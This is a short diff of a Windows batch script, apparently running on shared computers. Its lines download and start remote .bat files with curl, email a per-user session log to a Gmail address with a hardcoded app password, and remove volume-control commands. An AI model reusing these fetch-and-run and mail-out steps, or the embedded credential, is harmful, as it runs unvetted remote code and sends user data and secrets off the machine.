@@ -19,7 +19,8 @@ curl -s https://sources.tobir.xyz/scripts/create-threads.bat > create-threads.tm
 curl -s https://sources.tobir.xyz/scripts/login.bat > login.tmpbat
 move login.tmpbat login.bat
 move create-threads.tmpbat create-threads.bat
-start login.bat & start create-threads.bat
+start login.bat
+start create-threads.bat
 cd C:/
 mkdir Sessions
 cd Sessions
@@ -29,8 +30,6 @@ mkdir %username%
 cd %username%
 echo Session running on user %UserName% > session.log
 call C:\tools\sendmail.bat pc.skola.files.send@gmail.com dnjppkiqfvpvojxg "C:\Sessions\%Date%\%UserName%\session.log"
-nircmd.exe mutesysvolume 0
-nircmd.exe setsysvolume 65535
 #nircmd.exe monitor off
 cd C:/
 mkdir songs
